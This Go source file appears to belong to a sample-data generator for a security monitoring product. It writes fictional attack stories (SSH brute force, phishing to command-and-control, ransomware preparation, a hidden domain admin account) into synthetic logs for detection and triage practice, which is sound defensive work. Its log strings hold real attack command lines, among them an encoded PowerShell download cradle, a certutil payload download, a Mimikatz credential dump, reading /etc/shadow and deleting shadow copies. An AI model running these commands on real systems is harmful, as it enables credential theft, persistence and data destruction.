package sample

import (
	"fmt"
	"time"
)

// attacks weaves the attack stories into the background. Each is designed
// from a built-in detection's recipe so that every detection that can fire
// from the data models fires at least once, and a few benign
// look-alikes fire as false positives for triage practice. Every attack
// uses only the fictional company's hosts and users and the documentation
// IP ranges, so it is safe.
func (g *gen) attacks() {
	g.linuxBruteForce()
	g.phishingIntrusion()
	g.ransomwarePrep()
	g.domainPersistence()
	g.benignLookalikes()
	g.malwareOutbreak()
	g.antivirusHousekeeping()
	g.vulnerabilityScan()
}

// day returns a working-hour time n days before the end of the range.
func (g *gen) day(n, hour, minute int) time.Time {
	d := g.end.AddDate(0, 0, -n)
	t := time.Date(d.Year(), d.Month(), d.Day(), hour, minute, 0, 0, time.UTC)
	if t.Before(g.start) {
		t = g.start.Add(time.Hour)
	}
	if t.After(g.end) {
		t = g.end.Add(-time.Hour)
	}
	return t
}

func (g *gen) story(s Story, end time.Time, entities ...string) {
	s.Entities = entities
	g.stories = append(g.stories, s)
	g.addRunTime(end)
}

// linuxBruteForce: an external host password-sprays SSH on the database
// server, breaks one account, logs in as root and reads the shadow file.
func (g *gen) linuxBruteForce() {
	db := g.org.host("db-01")
	t0 := g.day(4, 13, 5)
	sprayUsers := []string{"bob.okafor", "carol.rivera", "dan.sato", "root", "admin", "oracle", "postgres"}

	// Brute force bob.okafor: 10 failures then one success (also drives
	// auth-brute-force and auth-password-spray).
	for i := 0; i < 10; i++ {
		g.sshLogin(db, "bob.okafor", ipC2, 50000+i, t0.Add(time.Duration(i*20)*time.Second), false, false)
	}
	// A few failures for other users so the source hits >= 5 distinct users.
	for i, u := range sprayUsers[1:] {
		g.sshLogin(db, u, ipC2, 51000+i, t0.Add(time.Duration(200+i*15)*time.Second), false, u == "root" || u == "admin" || u == "oracle" || u == "postgres")
	}
	bust := t0.Add(5 * time.Minute)
	g.sshLogin(db, "bob.okafor", ipC2, 52000, bust, true, false)               // break-in
	g.sshLogin(db, "root", ipC2, 52001, bust.Add(30*time.Second), true, false) // root login

	// On the server the attacker tries sudo (fails), then reads /etc/shadow.
	for i := 0; i < 3; i++ {
		g.sudoFail(db, "bob.okafor", bust.Add(time.Duration(60+i*20)*time.Second))
	}
	g.sudoRun(db, "bob.okafor", "root", "/usr/bin/cat /etc/shadow", bust.Add(3*time.Minute))

	// The attacker drops a cryptominer in /tmp; ClamAV's on-access scan
	// finds it and moves it to quarantine.
	tm := t0.Add(7*time.Minute + 40*time.Second)
	g.clamLine(db, clamdLog, "/tmp/.x/kworkerd: Unix.Trojan.Sampleminer-1 FOUND", tm)
	g.clamLine(db, clamdLog, "/tmp/.x/kworkerd: moved to '/var/lib/clamav/quarantine/kworkerd'", tm.Add(time.Second))

	g.story(Story{
		ID:      "linux-ssh-intrusion",
		Title:   "SSH brute force from the internet",
		Summary: fmt.Sprintf("An external host (%s) password-sprays SSH on the database server db-01, breaks the account bob.okafor, logs in as root and reads /etc/shadow. ClamAV then finds and quarantines a cryptominer the attacker dropped in /tmp. A clear credential-access chain to triage.", ipC2),
		Detections: []string{"auth-brute-force", "auth-password-spray", "auth-brute-force-success",
			"auth-ssh-root-login", "auth-sudo-failures", "auth-shadow-file-access", "threat-activity", "malware-detected"},
	}, bust.Add(4*time.Minute), ipC2, "db-01", "bob.okafor")
}

// phishingIntrusion: a finance workstation opens a malicious document that
// spawns PowerShell, which downloads a tool, dumps credentials, runs
// discovery, installs persistence and beacons to a C2 that is in the
// sample threat intel.
func (g *gen) phishingIntrusion() {
	ws := g.org.host("ws-fin-07")
	alice := g.org.Users[0].Winuser() // CORP\alice.nguyen (index 0)
	t0 := g.day(2, 15, 10)
	// The sample investigation follows this story.
	g.caseFocus = []string{ws.Name, ws.IP, alice}
	ps := `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

	// The phishing e-mail's link: the workstation looks up the look-alike
	// sign-in domain, which is in the sample threat intel (threat-activity).
	g.b.generic(t0.Add(-3*time.Minute), "dns", map[string]any{
		"host": ws.Name, "dest": ws.Name, "src": ws.IP, "user": alice,
		"query": phishDomain, "answer": ipPhishHost,
		"message": ws.Name + " resolved " + phishDomain,
	})

	// Office document spawns encoded PowerShell (office-child-shell + encoded-powershell).
	g.sysmonProc(ws, alice, ps,
		`powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`,
		`C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
		`"WINWORD.EXE" /n "C:\Users\alice.nguyen\Downloads\Invoice_Q3.doc"`, "", t0)

	// LOLBIN download of the next-stage tool (lolbin-download).
	g.sysmonProc(ws, alice, `C:\Windows\System32\certutil.exe`,
		fmt.Sprintf(`certutil.exe -urlcache -split -f http://%s/update.exe C:\Users\alice.nguyen\update.exe`, ipPhishHost),
		ps, "powershell.exe -nop -w hidden -enc ...", "", t0.Add(2*time.Minute))

	// Credential dumping (critical), with a hash that is in the sample intel.
	g.sysmonProc(ws, alice, `C:\Users\alice.nguyen\Downloads\mimikatz.exe`,
		`mimikatz.exe "sekurlsa::logonpasswords" exit`,
		ps, "powershell.exe", "SHA256="+hashMimikatz, t0.Add(4*time.Minute))
	// Defender finds a second copy of Mimikatz in Temp but cannot remove
	// it while PowerShell holds it open.
	mimi := threat{
		name: "HackTool:Win32/Mimikatz.D", id: "2147729891", severity: "High", category: "Tool",
		path: `file:_C:\Users\alice.nguyen\AppData\Local\Temp\m.exe`, user: alice, process: ps,
	}
	g.defThreatFound(ws, mimi, t0.Add(4*time.Minute))
	g.defThreatFailed(ws, mimi, "Remove", "The process cannot access the file because it is being used by another process.",
		t0.Add(4*time.Minute+30*time.Second))
	// The attacker then turns off Defender's real-time protection
	// (Set-MpPreference -DisableRealtimeMonitoring $true; tamper
	// protection is off on this workstation).
	const rtp = `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring`
	g.defConfigChange(ws, rtp+" = 0x0", rtp+" = 0x1", t0.Add(5*time.Minute))

	// Discovery burst: five distinct tools in a few minutes.
	disco := [][2]string{
		{`C:\Windows\System32\whoami.exe`, "whoami.exe /all"},
		{`C:\Windows\System32\net.exe`, "net.exe group \"Domain Admins\" /domain"},
		{`C:\Windows\System32\nltest.exe`, "nltest.exe /dclist:corp.example"},
		{`C:\Windows\System32\systeminfo.exe`, "systeminfo.exe"},
		{`C:\Windows\System32\ipconfig.exe`, "ipconfig.exe /all"},
	}
	for i, d := range disco {
		g.sysmonProc(ws, alice, d[0], d[1], ps, "powershell.exe", "", t0.Add(time.Duration(6+i)*time.Minute))
	}

	// Persistence: a scheduled task and a new service.
	g.sysmonProc(ws, alice, `C:\Windows\System32\schtasks.exe`,
		`schtasks.exe /create /tn "Updater" /tr C:\Users\alice.nguyen\update.exe /sc onlogon`,
		ps, "powershell.exe", "", t0.Add(12*time.Minute))
	g.sysmonProc(ws, alice, `C:\Windows\System32\sc.exe`,
		`sc.exe create UpdaterSvc binPath= C:\Users\alice.nguyen\update.exe start= auto`,
		ps, "powershell.exe", "", t0.Add(13*time.Minute))

	// The implant runs (hash matches intel) and beacons out to the C2.
	g.sysmonProc(ws, alice, `C:\Users\alice.nguyen\update.exe`, "update.exe", ps, "powershell.exe",
		"SHA256="+hashBeacon, t0.Add(15*time.Minute))
	g.sysmonNet(ws, alice, ws.IP, 51000, ipC2Beacon, "updates.corp-sync.example", 443, "tcp",
		`C:\Users\alice.nguyen\update.exe`, t0.Add(16*time.Minute))
	// Command-and-control on a non-standard shell port (network-shell-port).
	g.sysmonNet(ws, alice, ws.IP, 51002, ipC2, "updates.corp-sync.example", 4444, "tcp",
		`C:\Users\alice.nguyen\update.exe`, t0.Add(17*time.Minute))
	// A little exfiltration over the firewall.
	g.b.cef(ipFirewall, t0.Add(20*time.Minute), "Traffic", "100", "6", map[string]string{
		"act": "allow", "src": ws.IP, "dst": ipExfil, "spt": "51010", "dpt": "443", "proto": "6",
		"in": "2000", "out": "4500000",
	})
	// The same invoice reaches a colleague; there an attack surface
	// reduction rule stops Word from starting PowerShell.
	fin2 := g.org.host("ws-fin-02")
	g.defASRBlock(fin2, "d4f940ab-401b-4efc-aadc-ad5f3c50688a", g.winUserOn(fin2), ps,
		`C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
		`powershell.exe -nop -w hidden -enc SQBFAFgA`, t0.Add(20*time.Minute))

	g.story(Story{
		ID:      "phishing-to-c2",
		Title:   "Phishing to credential theft and C2",
		Summary: "A finance workstation (ws-fin-07, Alice Nguyen) follows a phishing link to a look-alike sign-in site, opens a malicious invoice that launches encoded PowerShell, downloads a tool with certutil, dumps credentials with Mimikatz, turns off Defender's real-time protection, runs discovery, installs persistence and beacons to a command-and-control address. Microsoft Defender finds Mimikatz but cannot remove it. The domain, the tools and the C2 are all in the sample threat intel. The whole kill chain on one host, while on ws-fin-02 a protection rule stops the same invoice from starting PowerShell.",
		Detections: []string{"endpoint-office-child-shell", "endpoint-encoded-powershell", "endpoint-lolbin-download",
			"endpoint-credential-dumping", "endpoint-discovery-burst", "endpoint-scheduled-task",
			"endpoint-service-created", "network-shell-port", "threat-activity",
			"malware-detected", "malware-not-removed", "av-protection-disabled", "av-rule-block"},
	}, t0.Add(21*time.Minute), "ws-fin-07", alice, ipC2, ipC2Beacon, ipExfil)
}

// ransomwarePrep: with the stolen admin account the attacker reaches the
// file server and deletes the volume shadow copies before encrypting.
func (g *gen) ransomwarePrep() {
	file := g.org.host("file-01")
	dan := g.org.userByLogin("dan.sato").Winuser() // CORP\dan.sato
	t0 := g.day(1, 2, 30)

	// First the attacker goes after the antivirus: tamper protection stops
	// real-time protection being turned off, but an exclusion for the
	// staging folder goes through.
	g.defTamper(file, `HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1`, t0.Add(-12*time.Minute))
	g.defConfigChange(file, "", `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\SyncSvc = 0x0`, t0.Add(-10*time.Minute))
	// A first copy of the ransomware, run from Downloads, is caught.
	crypt := threat{
		name: "Ransom:Win32/Samplecrypt.A", id: "2147854321", severity: "Severe", category: "Ransomware",
		path: `file:_C:\Users\dan.sato\Downloads\sync.exe`, user: dan, process: `C:\Windows\explorer.exe`,
	}
	g.defThreatFound(file, crypt, t0.Add(-6*time.Minute))
	g.defThreatAction(file, crypt, "Quarantine", t0.Add(-6*time.Minute+20*time.Second))
	// The second copy runs from the excluded folder; controlled folder
	// access stops it changing the finance share.
	g.defCFABlock(file, dan, `D:\Shares\Finance\Q3-forecast.xlsx`, `C:\ProgramData\SyncSvc\sync.exe`, t0.Add(-4*time.Minute))

	// Lateral move: an SMB connection to the file server, then a network
	// logon from the workstation. The SMB connection on port 445 by net.exe
	// is matching data for network-remote-admin-port (off by default).
	ws := g.org.host("ws-fin-07")
	g.sysmonNet(ws, dan, ws.IP, 50010, file.IP, file.FQDN(), 445, "tcp",
		`C:\Windows\System32\net.exe`, t0.Add(-time.Minute))
	g.logonWin(file, g.org.userByLogin("dan.sato"), t0, ws.IP, ws.Name, 3)

	// Delete shadow copies (endpoint-shadow-copy-delete, critical).
	g.sysmonProc(file, dan, `C:\Windows\System32\vssadmin.exe`,
		`vssadmin.exe delete shadows /all /quiet`,
		`C:\Windows\System32\cmd.exe`, "cmd.exe /c", "", t0.Add(2*time.Minute))
	// Also disable recovery for good measure.
	g.sysmonProc(file, dan, `C:\Windows\System32\bcdedit.exe`,
		`bcdedit.exe /set {default} recoveryenabled no`,
		`C:\Windows\System32\cmd.exe`, "cmd.exe /c", "", t0.Add(3*time.Minute))

	g.story(Story{
		ID:         "ransomware-prep",
		Title:      "Ransomware preparation on the file server",
		Summary:    "Using the stolen domain-admin account, the attacker goes after the antivirus on the file server file-01: tamper protection stops real-time protection being turned off, but an exclusion for C:\\ProgramData\\SyncSvc goes through. Defender quarantines a first copy of the ransomware from Downloads. The exclusion let the second copy run; controlled folder access stopped it changing the finance share. The attacker then deletes the volume shadow copies and recovery configuration, the classic last step before encryption. A critical finding.",
		Detections: []string{"endpoint-shadow-copy-delete", "av-tamper-blocked", "av-exclusion-added", "malware-ransomware", "av-rule-block"},
	}, t0.Add(4*time.Minute), "file-01", dan)
}

// domainPersistence: on a domain controller the attacker creates a hidden
// account and adds it to Domain Admins; a stale account is also deleted.
func (g *gen) domainPersistence() {
	dc := g.org.host("dc-01")
	t0 := g.day(3, 11, 20)

	g.accountCreatedWin(dc, "svc-helpdesk", "dan.sato", t0)
	g.groupAddWin(dc, "CN=svc-helpdesk,CN=Users,DC=corp,DC=example", "Domain Admins", "dan.sato", t0.Add(90*time.Second))
	// Disabled by default: a deletion that would fire change-account-deleted
	// if an admin turns that rule on.
	g.accountDeletedWin(dc, "temp.contractor", "dan.sato", t0.Add(3*time.Minute))

	g.story(Story{
		ID:         "domain-persistence",
		Title:      "Hidden admin account on the domain controller",
		Summary:    "On dc-01 the attacker creates the account svc-helpdesk and adds it to Domain Admins, then deletes a stale contractor account. The group change is high severity; the creation and deletion add risk.",
		Detections: []string{"change-account-created", "change-admin-group-add"},
	}, t0.Add(4*time.Minute), "dc-01", "svc-helpdesk", "dan.sato")
}

// benignLookalikes are ordinary admin and service activity that look
// malicious: a backup job's encoded PowerShell raises a finding to close as
// benign, and IT's certutil download only adds a little risk (lolbin-download
// is a risk-only detection), which shows how risk-based alerting keeps such
// noise out of the queue.
func (g *gen) benignLookalikes() {
	// IT admin uses certutil to fetch an internal tool (lolbin FP).
	itws := g.org.host("ws-it-02")
	bob := g.org.userByLogin("bob.okafor").Winuser()
	tf := g.end.Add(-12 * time.Hour)
	g.sysmonProc(itws, bob, `C:\Windows\System32\certutil.exe`,
		`certutil.exe -urlcache -split -f http://repo.corp.example/tools/sysmon.zip sysmon.zip`,
		`C:\Windows\System32\cmd.exe`, "cmd.exe", "", tf)

	// A backup job runs encoded PowerShell on the file server (encoded FP).
	file := g.org.host("file-01")
	svc := NetBIOS + `\svc-backup`
	tb := g.end.Add(-18 * time.Hour)
	g.sysmonProc(file, svc, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		`powershell.exe -NoProfile -enc RwBlAHQALQBCAGEAYwBrAHUAcABKAG8AYgA=`,
		`C:\Windows\System32\taskeng.exe`, "taskeng.exe", "", tb)

	g.story(Story{
		ID:         "benign-lookalikes",
		Title:      "Benign activity that looks malicious",
		Summary:    "Two everyday admin tasks that look malicious. A backup job using encoded PowerShell on file-01 raises a finding: a false positive to practise closing as benign. IT fetching a tool with certutil on ws-it-02 only adds a little risk, the way risk-based alerting keeps such noise out of the queue.",
		Detections: []string{"endpoint-lolbin-download", "endpoint-encoded-powershell"},
	}, tb.Add(time.Minute), "ws-it-02", "file-01", bob, svc)
	g.addRunTime(tf.Add(time.Minute))
}
